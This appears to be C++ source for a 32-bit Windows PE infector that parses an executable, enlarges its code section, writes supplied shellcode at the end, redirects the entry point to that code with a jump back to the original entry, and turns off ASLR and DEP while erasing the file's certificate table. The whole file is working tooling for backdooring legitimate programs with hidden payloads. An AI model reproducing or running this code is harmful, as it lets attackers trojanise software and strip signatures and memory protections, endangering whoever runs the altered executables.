#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <memory>
#include "PE.h"
#include <bitset>
#include <sstream>
using namespace std;

constexpr std::size_t
align_up(std::size_t value, std::size_t alignment) noexcept
{
	return (value + alignment - 1) & ~(alignment - 1);
}


namespace PE
{
	void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
	{
		this->size_ids = size_ids_;
		this->size_dos_stub = size_dos_stub_;
		this->size_inh32 = size_inh32_;
		this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
		this->size_sections = size_sections_;
	}

	tuple<bool, char*, streampos> OpenBinary(string filename)
	{
		auto flag = false;
		fstream::pos_type size{};
		char* bin{};


		ifstream ifile(filename, ios::binary | ios::in | ios::ate);
		if (ifile.is_open())
		{
			size = ifile.tellg();
			bin = new char[size];
			ifile.seekg(0, ios::beg);
			ifile.read(bin, size);
			ifile.close();
			flag = true;
		}
		return make_tuple(flag, bin, size);
	}

	PE_FILE ParsePE(const char* PE)
	{
		PE_FILE pefile{};
		memcpy_s(&pefile.ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
		memcpy_s(&pefile.inh32, sizeof(IMAGE_NT_HEADERS32), PE + pefile.ids.e_lfanew, sizeof(IMAGE_NT_HEADERS32)); // address of PE header = e_lfanew
		size_t stub_size = pefile.ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
		pefile.MS_DOS_STUB = vector<char>(stub_size);
		memcpy_s(pefile.MS_DOS_STUB.data(), stub_size, (PE + 0x3c + 0x4), stub_size);
		if (pefile.inh32.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		{
			std::cout << "Please, only 32-bit PE :)\n";
			getchar();
			exit(1);
		}
		auto number_of_sections = pefile.inh32.FileHeader.NumberOfSections;
		pefile.ish = vector<IMAGE_SECTION_HEADER>(number_of_sections + 1); // Number of sections

		auto PE_Header = PE + pefile.ids.e_lfanew;
		auto First_Section_Header = PE_Header + 0x18 + pefile.inh32.FileHeader.SizeOfOptionalHeader; // First Section: PE_header + sizeof FileHeader + sizeof Optional Header
		// First Section: PE_header + sizeof FileHeader + sizeof Optional Header
		
		// copy section headers																								// copy section headers
		for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
		{
			memcpy_s(&pefile.ish[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
		}

		for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
		{
			shared_ptr<char> t_char(new char[pefile.ish[i].SizeOfRawData]{}, std::default_delete<char[]>()); // Section
			memcpy_s(t_char.get(), pefile.ish[i].SizeOfRawData, PE + pefile.ish[i].PointerToRawData, pefile.ish[i].SizeOfRawData); // copy sections.
			pefile.Sections.push_back(t_char);
		}
		size_t sections_size{};
		for (WORD i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
		{
			sections_size += pefile.ish[i].SizeOfRawData;
		}

		pefile.set_sizes(sizeof(pefile.ids), stub_size, sizeof(pefile.inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);

		return pefile;
	}

	void WriteBinary(PE_FILE pefile, std::string file_name, size_t size)
	{
		pefile.inh32.OptionalHeader.CheckSum = 0;

		auto r_ch = new char[size] {};

		memcpy_s(r_ch, pefile.size_ids, &pefile.ids, pefile.size_ids); // First we copy the DOS Header
		memcpy_s(r_ch + pefile.size_ids, pefile.size_dos_stub, pefile.MS_DOS_STUB.data(), pefile.size_dos_stub); // Then the DOS Stub
		memcpy_s(r_ch + pefile.size_ids + pefile.size_dos_stub, pefile.size_inh32, &pefile.inh32, pefile.size_inh32); // Later the 32 bit Headers (optional and mandatory)

		for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections + 1; ++i)
		{
			// Copy all sections
			memcpy_s(r_ch + pefile.size_ids + pefile.size_dos_stub + pefile.size_inh32 + i * sizeof(IMAGE_SECTION_HEADER), sizeof(IMAGE_SECTION_HEADER), &pefile.ish[i], sizeof(IMAGE_SECTION_HEADER));
		}


		for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
		{
			// Update the maximum size of the data for all sections
			memcpy_s(&r_ch[pefile.ish[i].PointerToRawData], pefile.ish[i].SizeOfRawData, pefile.Sections[i].get(), pefile.ish[i].SizeOfRawData);
		}

		ofstream ofile(file_name, ios::binary | ios::out);
		ofile.write(r_ch, size);
		std::cout << "\nEOF\n" << endl;
		ofile.close();
	}

	void Inject_Resize_Code(char* pe_file, size_t size_of_pe, char xcode[], size_t size_of_xcode, const std::string& out_path)
	{
		auto Parsed_PE = ParsePE(pe_file);

		if (Parsed_PE.ids.e_magic != IMAGE_DOS_SIGNATURE)
		{
			std::cout << "Sorry, I have no idea how to deal with this kind of files :/\n";
			exit(1);
		}

		if (Parsed_PE.inh32.OptionalHeader.ImageBase < 0x400000 && Parsed_PE.inh32.OptionalHeader.ImageBase > 0x1000000)
		{
			std::cout << "Sorry, I have no idea how to deal with this kind of files :/\n";
			exit(1);
		}

		// tuple<WORD, size_t, size_t> ready_section_index_size{};
		WORD code_section{};
		for (WORD i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; ++i)
		{
			if (Parsed_PE.ish[i].Characteristics & IMAGE_SCN_CNT_CODE)
			{
				code_section = { i };
				break;
			}
		}

		auto imagebase = Parsed_PE.inh32.OptionalHeader.ImageBase;
		auto OEP = Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
		auto image_base_OEP = imagebase + OEP;
		char push[] = "\x68"; // push
		char esp[] = "\xff\x24\x24"; // jmp [esp]
		char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP
		auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 4;

		auto Last_of_Original_Raw_Address = Parsed_PE.ish[code_section].SizeOfRawData;
		auto aligned_size_of_xcode = align_up(inj_size, Parsed_PE.inh32.OptionalHeader.FileAlignment);
		Parsed_PE.ish[code_section].SizeOfRawData += aligned_size_of_xcode; // resize size of code section


		for (size_t i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; ++i)
		{
			if (Parsed_PE.ish[i].PointerToRawData > Parsed_PE.ish[code_section].PointerToRawData)
			{
				Parsed_PE.ish[i].PointerToRawData += aligned_size_of_xcode;
			}
		}

		auto section_ = code_section;
		auto index_ = Last_of_Original_Raw_Address;

		auto AEP = index_ + Parsed_PE.ish[section_].VirtualAddress;
		Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint = AEP;

		auto size_of_code_section = Parsed_PE.ish[section_].SizeOfRawData;
		shared_ptr<char> n_section(new char[size_of_code_section + aligned_size_of_xcode]{}, std::default_delete<char[]>());
		memcpy(n_section.get(), Parsed_PE.Sections[section_].get(), size_of_code_section);


		auto inj_section = n_section.get();
		memcpy(&inj_section[index_], xcode, size_of_xcode - 1);
		memcpy(&inj_section[index_ + size_of_xcode - 1], push, sizeof push);
		memcpy(&inj_section[index_ + size_of_xcode + sizeof push - 2], hex_oep, sizeof hex_oep);
		memcpy(&inj_section[index_ + sizeof hex_oep + sizeof push + size_of_xcode - 2], esp, sizeof esp);

		Parsed_PE.Sections[section_] = n_section;

		// disable ASLR
		Parsed_PE.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		Parsed_PE.inh32.OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
		Parsed_PE.inh32.OptionalHeader.DataDirectory[5].Size = { 0 };
		Parsed_PE.inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

		// disable DEP
		Parsed_PE.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

		// zeroize CERTIFICATE table's offset and size
		Parsed_PE.inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
		Parsed_PE.inh32.OptionalHeader.DataDirectory[4].Size = { 0 };

		// If v_sz != 0 and v_sz < r_sz, increase v_sz by sizeof(xcode).
		if (Parsed_PE.ish[code_section].SizeOfRawData > Parsed_PE.ish[code_section].Misc.VirtualSize && Parsed_PE.ish[code_section].Misc.VirtualSize != 0) {
			Parsed_PE.ish[code_section].Misc.VirtualSize += inj_size + 0x17;  // just enough
			auto last_section = Parsed_PE.inh32.FileHeader.NumberOfSections - 1;
			Parsed_PE.inh32.OptionalHeader.SizeOfImage = Parsed_PE.ish[last_section].VirtualAddress + align_up((Parsed_PE.ish[last_section].Misc.VirtualSize) ? Parsed_PE.ish[last_section].Misc.VirtualSize : Parsed_PE.ish[last_section].SizeOfRawData, Parsed_PE.inh32.OptionalHeader.SectionAlignment);
		}

		auto size_of_changed_pe = size_of_pe + aligned_size_of_xcode;

		WriteBinary(Parsed_PE, out_path, size_of_changed_pe);

	}

}
